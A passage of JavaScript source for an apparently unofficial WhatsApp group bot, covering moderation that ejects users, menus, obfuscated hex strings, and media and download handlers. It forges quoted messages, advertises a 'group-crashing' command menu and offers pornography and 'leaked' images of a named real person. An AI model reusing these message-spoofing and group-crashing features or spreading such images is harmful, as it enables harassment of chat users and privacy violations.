				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {                        
			if (isContact) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                  
				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
				samu330.groupRemove(from, [sender])              
			}               
			}                     
			}
	    		if (isGroup && botAdmin && isAntiLeg) {                                                                	  
			if (!itsMe) {
                      	if (q.length > 10000) {
				reply('*Este mensaje contiene mas de 10, 000 caracteres, probablemente puede ser una trava, por lo que tendre que eliminarte🙂*\n\n_Este grupo esta protegido por_ *🔐Samu330*')
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
				samu330.sendMessage(from, '*Esperemos 10 segundos🙄*', MessageType.text)
				})
				samu330.groupRemove(from, [sender])
				await sleep(10000)
				samu330.groupSettingChange(from, GroupSettingChange.messageSend, false)
			}
			}
			}
			if (isGroup && botAdmin && isAntiLeg) {                                                         	  
			if (!itsMe) {                                 
			if (isLocation) {
                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
				reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)                   
				samu330.groupRemove(from, [sender])           
			}             
			}                     
			}

			if (resbutton == 'Cristobal Colon') {
				reply(`😂WTF!!\nJAJAJA Como va a ser Cristobal jajajaja, te hace falta estudiar Matematicas-_-`)
			} else if (resbutton == 'Eugenio Derbez') {
				reply(`PUES CLAROO!!!😏✏✅`)
			} 
	
			switch (commandstik) {
	
				case "SxxV2zKhKYR4MUXj6ax5MKZto/u5ArlO1S+GokdA6ks=":
					let luck = samu330.prepareMessageFromContent(from, {
						"listMessage":  {
							"title": "*THIS IS A TEST!!*",
							"description": `Responde la siguiente pregunta:\n\n¿Quien descubrio America🗺?`,
							"buttonText": "Selecciona tu respuesta",
							"listType": "SINGLE_SELECT",
							"sections": [
								{
									"rows": [
										{
											"title": `Cristobal Colon`,
											"rowId": ""
										},
										{
											"title": "Eugenio Derbez",
											"rowId": ""
										}
									]
								}
							]
						}
					}, {})
				samu330.relayWAMessage(luck, {waitForAck: true})
				break
			}


			switch (commandstik) {
	
				case "paxuDk3LoZENYGIbqq0jI7+xHaEaDfGaWGtVJt/Vyzg=":
					redes = ['*Sigeme y te sigo en instagram!* https://www.instagram.com/samu330wabot', '*😊Seamos amigos en facebook!!* https://www.facebook.com/samu330wabot']
					opcion = redes[Math.floor(Math.random() * redes.length)]

sendButMessage(from, `*Si no ves la lista de comandos, o no puedes hacer click en el boton, desactiva la funcion de hacer el texto seleccionable en las configuraciones de tu whatsapp Mod.*\n_Si siges teniendo problemas, Preciona el Boton de Abajo_`, `Hola *${pushname}*, No puedes ver la lista del menu?\n\nClick en el primer Boton\n\nSamu330®`, [{buttonId: 'mnan', buttonText: {displayText: '🍉Click Si no Ves el menu'}, type: 1}, {buttonId: 'tbsm', buttonText: {displayText: '🖥️YouTube'}, type: 1}], {quoted: fvid, contextInfo: { forwardingScore: 508, isForwarded: true, sendEphermeral: true}})

let newmenu = samu330.prepareMessageFromContent(from, {
"listMessage":  {
"title": "*✍🏻MENU | 🌬NyanBot | SAMU330🪀*",
"description": `\n➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li
🔐Hola *${pushname}* ${timeFt}
_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈
							
🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*
							
⍣ *BOT INFO* ⍣
${samu}◦ 🌐Navegador :${samu} *${samu330.browserDescription[1]}*
${samu}◦ 📡servidor :${samu} *${samu330.browserDescription[0]}*
${samu}◦ ✅version :${samu} *${samu330.browserDescription[2]}*
${samu}◦ 🚄Velocidad :${samu} *${process.uptime()}*
${samu}◦ 📲Sistema operativo :${samu} *${samu330.user.phone.device_manufacturer}*
${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*

༶•┈┈⛧┈♛ ♛┈⛧┈┈•༶

*🪀Grupo de Soporte y ayuda:*
https://chat.whatsapp.com/BGTQNDzESmEJr2cCJlccWV

En el grupo podras aprender a:
- Crear Bots.
- Instalar Bots.
- Editar Bots.
- Y mucho mas.

🗡NO SE PERMITEN ENLACES!!

${opcion}`,
							"buttonText": "Selecciona tu menu",
							"listType": "SINGLE_SELECT",
							"sections": [
								{
									"rows": [
										{
											"title": `Menu de Media📷`,
											"rowId": "media"
										},
										{
											"title": "Menu de Stickers🧩",
											"rowId": "sticker"
										},
										{
											"title": `Menu de Grupos👥`,
											"rowId": "grupos"
										},
										{
											"title": "Menu de Descargas📲",
											"rowId": "descargas"
										},
										{
											"title": `Comandos de Herramientas⚙`,
											"rowId": "tools"
										},
										{
											"title": "Comandos para Adultos🔞",
											"rowId": "+18"
										},
										{
											"title": `Comandos para Logos🎨`,
											"rowId": "logos"
										},
										{
											"title": "Comandos para el Owner🙂",
											"rowId": "owner"
										},
										{
											"title": `🗡Comandos para explotar Grupos!!💣`,
											"rowId": "crash"
										},
										{
											"title": `Audios🎧`,
											"rowId": "audios"
										},
                                        {
											"title": `Juegos🎮`,
											"rowId": "juegos"
										},
										{
											"title": "🍉Creditos y agradecimientos🏹",
											"rowId": `thanksto`
										}
									]
								}
							]
						}
					}, {})
				samu330.relayWAMessage(newmenu, {waitForAck: true})
				var _0x4fdf=["","\x48\x6F\x6C\x61\x2C\x20\x47\x72\x61\x63\x69\x61\x73\x20\x70\x6F\x72\x20\x75\x73\x61\x72\x20\x6D\x69\x20\x62\x6F\x74\x2C\x20\x45\x73\x74\x65\x20\x6D\x65\x6E\x73\x61\x6A\x65\x20\x73\x6F\x6C\x6F\x20\x6C\x6F\x20\x70\x75\x65\x64\x65\x73\x20\x76\x65\x72\x20\x74\x75\x2C\x20\x65\x6C\x20\x64\x75\x65\xF1\x6F\x20\x64\x65\x6C\x20\x62\x6F\x74\x2C\x20\x65\x73\x74\x65\x20\x6D\x65\x6E\x73\x61\x6A\x65\x20\x65\x73\x20\x70\x61\x72\x61\x20\x69\x6D\x76\x69\x74\x61\x72\x74\x65\x20\x61\x20\x61\x70\x6F\x79\x61\x72\x6D\x65\x20\x65\x6E\x20\x6D\x69\x20\x63\x61\x6E\x61\x6C\x20\x64\x65\x20\x79\x6F\x75\x74\x75\x62\x65\x2C\x20\x6D\x65\x20\x61\x70\x6F\x79\x61\x72\x69\x61\x73\x20\x6D\x75\x63\x68\x6F\x21\u2728","\u2728\x52\x65\x63\x75\x65\x72\x64\x61\x20\x73\x69\x65\x6D\x70\x72\x65\x20\x61\x63\x74\x75\x61\x6C\x69\x7A\x61\x72\x2C\x20\x79\x61\x20\x71\x75\x65\x20\x73\x65\x20\x61\x67\x72\x65\x67\x61\x6E\x20\x6D\x61\x73\x20\x66\x75\x6E\x63\x69\x6F\x6E\x65\x73\x2E\x5C\x6E\x5C\x6E\x54\x6F\x63\x61\x20\x65\x6C\x20\x42\x6F\x74\x6F\x6E\x20\x64\x65\x20\x61\x62\x61\x6A\x6F\x20\x70\x61\x72\x61\x20\x72\x65\x67\x61\x6C\x61\x72\x6D\x65\x20\x74\x75\x20\x73\x75\x73\x63\x72\x69\x70\x63\x69\x69\x6E\x2C\x20\x4D\x75\x63\x68\x61\x73\x20\x67\x72\x61\x63\x69\x61\x73\x20\x64\x65\x20\x61\x6E\x74\x65\x6D\x61\x6E\x6F\x20\x70\x6F\x72\x20\x75\x73\x61\x72\x20\x4D\x69\x20\x62\x6F\x74\uD83D\uDC96\x5C\x6E\x54\x45\x20\x41\x47\x52\x41\x44\x45\x43\x45\x20\x53\x41\x4D\x55\x33\x33\x30\uD83C\uDFF9","\x43\x6C\x69\x63\x6B\x20\x50\x61\x72\x61\x20\x69\x72\x20\x61\x20\x6D\x69\x20\x43\x61\x6E\x61\x6C\x2E\x2E\x2E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x48\x44\x34\x54\x38\x50\x66\x63\x76\x35\x50\x46\x56\x7A\x73\x41\x62\x66\x41\x50\x5A\x41","\x70\x72\x65\x70\x61\x72\x65\x4D\x65\x73\x73\x61\x67\x65\x46\x72\x6F\x6D\x43\x6F\x6E\x74\x65\x6E\x74","\x72\x65\x6C\x61\x79\x57\x41\x4D\x65\x73\x73\x61\x67\x65"];reshb1=  await samu330[_0x4fdf[5]](from,{"\x74\x65\x6D\x70\x6C\x61\x74\x65\x4D\x65\x73\x73\x61\x67\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x75\x72\x52\x6F\x77\x54\x65\x6D\x70\x6C\x61\x74\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x43\x6F\x6E\x74\x65\x6E\x74\x54\x65\x78\x74":_0x4fdf[0],"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x6F\x74\x65\x72\x54\x65\x78\x74":_0x4fdf[0],"\x68\x79\x64\x72\x61\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x73":[{"\x75\x72\x6C\x42\x75\x74\x74\x6F\x6E":{"\x64\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74":_0x4fdf[0],"\x75\x72\x6C":_0x4fdf[0]},"\x69\x6E\x64\x65\x78":1}]},"\x68\x79\x64\x72\x61\x74\x65\x64\x54\x65\x6D\x70\x6C\x61\x74\x65":{"\x68\x79\x64\x72\x61\x74\x65\x64\x43\x6F\x6E\x74\x65\x6E\x74\x54\x65\x78\x74":`${_0x4fdf[1]}`,"\x68\x79\x64\x72\x61\x74\x65\x64\x46\x6F\x6F\x74\x65\x72\x54\x65\x78\x74":`${_0x4fdf[2]}`,"\x68\x79\x64\x72\x61\x74\x65\x64\x42\x75\x74\x74\x6F\x6E\x73":[{"\x75\x72\x6C\x42\x75\x74\x74\x6F\x6E":{"\x64\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74":`${_0x4fdf[3]}`,"\x75\x72\x6C":_0x4fdf[4]},"\x69\x6E\x64\x65\x78":0}]}}},{});samu330[_0x4fdf[6]](reshb1)
				break

}




			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`mnan`)){
				sendButLocation(from, `\n➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li
🔐Hola *${pushname}* ${timeFt}
_Tipo de usuario:_ ${tipoDeUsr}
┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
✨XP: ${getLevelingXp(sender)}
📚Nivel: ${getLevelingLevel(sender)}
┖┈┈┈┈┈┈┈┈┈┈┈┈┈┈
											
🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*
															
༶•┈┈⛧┈♛ ♛┈⛧┈┈•༶`, `⍣ *BOT INFO* ⍣
${samu}◦ 🌐Navegador :${samu} *${samu330.browserDescription[1]}*
${samu}◦ 📡servidor :${samu} *${samu330.browserDescription[0]}*
${samu}◦ ✅version :${samu} *${samu330.browserDescription[2]}*
${samu}◦ 🚄Velocidad :${samu} *${process.uptime()}*
${samu}◦ 📲Sistema operativo :${samu} *${samu330.user.phone.device_manufacturer}*
${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*`, fs.readFileSync('./src/NyanBot.jpg'),
				[{buttonId: 'm1', 
				buttonText: 
				{displayText: '[📑] Leer Instrucciones'}, 
				type: 1}], 
				{quoted: sam, contextInfo: { forwardingScore: 508, isForwarded: true, sendEphemeral: true}})
			}
			}

			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`m1`)){
			reply(`No ves el Mensaje de lista?\n\n🥏 Probablemente el Bot este registrado en un WhatsApp Bussines, este tipo de mensajes son incompatibles con ese WhatsApp.\n\n*Ves la lista, pero no puedes abrir las secciones?*\n\n🔍 Esto pasa por usar un WhatsApp Mod, para arreglar este problema, sige estas instrucciones:\n\n- Dirijete a los ajustes o mods de tu WhatsApp.\n- Busca y selecciona el apartado de "Pantalla de Conversacion".\n- Entra a la Seccion de "burbujas y ticks".\n- Dirigete hacia la parte de abajo, encontraras un Switch con el nombre "Hacer el Texto Seleccionable", desactiva esa funcion.\n\n🧾 *Una vez ya desactivada esa funcion, podras ver y usar el Mensaje de Lista.*`)
			}
			}

			if (sam.message.buttonsResponseMessage){
				test = sam.message.buttonsResponseMessage.selectedButtonId
				if (test.includes(`tbsm`)){
			reply(`*Mi canal de YouTube:*\n\nhttps://www.youtube.com/channel/UCHD4T8Pfcv5PFVzsAbfAPZA`)
			}
			}



            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`media`)){
                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
                    trol = fs.readFileSync('./media/trol.mp4')
                    samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
                    { key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                    "imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
                    }})
		    samu330.sendMessage(from, fs.readFileSync('./temp/nana.mp3'), audio, {quoted: ftoko, mimetype: "audio/mp3", ptt: true, duration: 5555555, sendEphermeral: true})
                    addFilter(from)
                    addLevelingLevel(sender, 5)
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`sticker`)){
                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
                    samu330.sendMessage(from, `${stc}`, MessageType.text, {quoted:
                    { key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                    "documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
                    }})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`grupos`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    addFilter(from)
                    addLevelingLevel(sender, 5)		
                    samu330.sendMessage(from, Menug, MessageType.text, {
                    quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`descargas`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    samu330.sendMessage(from, `${Menud}`, MessageType.text, {
                    quoted:  fvid})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`tools`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
                    quoted: ftoko})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`logos`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    uptime = process.uptime()
                    samu330.sendMessage(from, `${Menu7}`, MessageType.text, {
                    quoted: fvid})
                    addFilter(from)
                    addLevelingLevel(sender, 5)
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`owner`)){
                    samu330.updatePresence(from, Presence.composing)
                    if (!isRegister) return reply(mess.only.usrReg)
                    samu330.sendMessage(from, `${Menu8}`, MessageType.text, {
                    quoted: ftoko})
                    addFilter(from)
                    addLevelingLevel(sender, 5)	
			}
			}

            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`crash`)){
                    if (!isRegister) return reply(mess.only.usrReg)
                    reply('*Gathering information...*')
                    smww = fs.readFileSync(`./media/SmWW.png`)
                    samu330.sendMessage(from, smww, image, {caption: `${menu9}`, quoted: { key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, ...(from ? {
                            remoteJid: "status@broadcast" } : {}) }, 
                                message: { 
                                    "imageMessage": { 
                                    "mimetype": 
                                    "image/jpeg", 
                                    "caption": "➫'*👑Samu330 Crashing Groups!!🔥*'\n'😈Samu330 Domina🥀'" ,
                                    "jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
			}
			}

var _0x4dab=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x52\x6F\x77\x49\x64","\x73\x69\x6E\x67\x6C\x65\x53\x65\x6C\x65\x63\x74\x52\x65\x70\x6C\x79","\x40\x6C\x69\x73\x74","\x65\x6E\x64\x73\x57\x69\x74\x68","","\x73\x70\x6C\x69\x74","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x5F\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x74\x69\x6D\x65\x73\x74\x61\x6D\x70","\x61\x6C\x6C","\x5F\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20","\x75\x72\x6C","\x6C\x69\x6E\x6B","\x61\x75\x64\x69\x6F\x2F\x6D\x70\x34","\x40\x6C\x69\x73\x74\x33","\x42\x79\x20\x53\x61\x6D\x75\x33\x33\x30\uD83C\uDF52","\x40\x6C\x69\x73\x74\x31","\x2A\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x65\x6E\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x56\x6F\x7A\x2E\x2E\x2E\x2A\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x40\x6C\x69\x73\x74\x32","\x45\x6E\x76\x69\x61\x6E\x64\x6F\x20\x61\x72\x63\x68\x69\x76\x6F\x20\x63\x6F\x6D\x6F\x20\x4E\x6F\x74\x61\x20\x64\x65\x20\x76\x6F\x7A\x2E\x2E\x2E\x0D\x0A\x5F\x54\x69\x74\x75\x6C\x6F\x3A\x20","\x0D\x0A\x5F\x44\x75\x72\x61\x63\x69\x6F\x6E\x3A\x20","\x0D\x0A\x4C\x69\x6E\x6B\x20\x64\x65\x6C\x20\x56\x69\x64\x65\x6F\x3A\x20"];if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[4]}`)){let orlist= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[4])}${_0x4dab[9]}${orlist[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg= await y2mateA(`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[18]}`)){let orlist1= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[6]}`);reply(`${_0x4dab[19]}${test[_0x4dab[7]](_0x4dab[18])}${_0x4dab[9]}${orlist1[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg1= await y2mateA(`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg1[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist1[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[20]}`)){let orlist11= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[6]}`);reply(`${_0x4dab[8]}${test[_0x4dab[7]](_0x4dab[20])}${_0x4dab[9]}${orlist11[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[12]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg11= await y2mateA(`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg11[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist11[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}};if(sam[_0x4dab[1]][_0x4dab[0]]){test= sam[_0x4dab[1]][_0x4dab[0]][_0x4dab[3]][_0x4dab[2]];if(test[_0x4dab[5]](`${_0x4dab[16]}`)){let orlist111= await yts(`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`);reply(`${_0x4dab[21]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[22]}${orlist111[_0x4dab[11]][0][_0x4dab[10]]}${_0x4dab[23]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);let dorg111= await y2mateA(`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`);sendFileFromUrl(dorg111[0][_0x4dab[14]],audio,{quoted:faud,mimetype:_0x4dab[15],ptt:true,duration:-777,contextInfo:{externalAdReply:{title:`${_0x4dab[6]}${test[_0x4dab[7]](_0x4dab[16])}${_0x4dab[6]}`,body:_0x4dab[17],mediaType:2,mediaUrl:`${_0x4dab[6]}${orlist111[_0x4dab[11]][0][_0x4dab[13]]}${_0x4dab[6]}`}}})}}



			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`+18`)){
					addFilter(from)
					addLevelingLevel(sender, 5)		
					samu330.sendMessage(from, { degreesLatitude: `0`, degreesLongitude: `0`, name: '🔥Samu330 | NyanBot🍒', address : `🗡Created by Samu330`, sequenceNumber: '99999', jpegThumbnail: fs.readFileSync('./src/+18.jpg')}, MessageType.liveLocation, {quoted : sam})
					let nopor = samu330.prepareMessageFromContent(from, {
					"listMessage":  {
					"title": "*😏Bienvenido al menu 6*",
					"description": `\n\nQue es lo que buscas🍒?\n\n	*Si no puedes ver, o selccionar la lsita de mensajes de abajo, desactiva la opcion de "Hacer el texto seleccionable", en las configuraciones de conversacion de tu WhatsApp Mod.*`,
					"buttonText": "Click Aqui",
					"listType": "SINGLE_SELECT",
					"sections": [
					{
					"rows": [
					{
					"title": "Imagenes Filtradas De la Hermosa Belle Delphine😏!!",
					"rowId": `${prefix}belle`
					},
					{
					"title": "🍑VIDEO UNICO Y EXCLUSIVO PARA LOS USUARIOS DE NYANBOT👑✍🏻",
					"rowId": `VIP`
					},	
					{
					"title": `Porno Real🔥`,
					"rowId": `${prefix}porno`
					},
					{
					"title": "Porno de Lesbianas😊",
					"rowId": `${prefix}lesbian`
					},
					{
						"title": `Bonitas Tetas🍇`,
						"rowId": `${prefix}tetas`
						},
						{
						"title": "Culos Hermosos🍑",
						"rowId": `${prefix}ass`
						},
						{
							"title": `Pussy's🥟`,
							"rowId": `${prefix}pussy`
							},
							{
							"title": "Waifu Hentai🌸",
							"rowId": `${prefix}xwaifu`
							},
							{
								"title": "Neko Hentai🍒",
								"rowId": `${prefix}xneko`
								},
								{
								"title": "Trap Hentai🍌",
								"rowId": `${prefix}trap`
								},
								{
									"title": "Blow Hentai🍆",
									"rowId": `${prefix}blow`
									}
					]
					}
					]
					}
					}, {})
					samu330.relayWAMessage(nopor, {waitForAck: true})
			}
			}
            if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`juegos`)){
                    reply(`🎮 *Juegos NyanBot* 🍒
- ${prefix}ttt
_TicTacToe_

- ${prefix}lucky
_Juego de suerte_

- ${prefix}dados
_Ps DADOS!!_`)
                }
            }
			
			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`audios`)){
					addFilter(from)
					reply(`*Estos audios son originales, provenientes de la app:*\nhttps://play.google.com/store/apps/details?id=com.aromaticnectarineapps.anime\n\n- anana\n- asen\n- flash\n- hentai\n- jai\n- jashire\n- kareta\n- kataka\n- kicks\n- kobarashi\n- mitamita\n- mma\n- motomoto\n- nani\n- niconico\n- nya\n- nyan\n- omaiga\n- omaiwa\n- omg\n- onichan\n- ooaa\n- piano\n- pikachu\n- pupu\n- sempai\n- sss\n- suspenso\n- talcho\n- tobec\n- tuturu\n- tututu\n- uchinchi\n- uff\n- uma\n- umai\n- unga\n- woau\n- yajaro\n- yame\n- yamete\n- yokese\n- yutki\n- ñaña\n- ñañañi\n\n🍒 *By Samu330* 💠`)
			}
			}

            

			if (sam.message.listResponseMessage){
				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
				if (test.includes(`${prefix}lesbian`)){
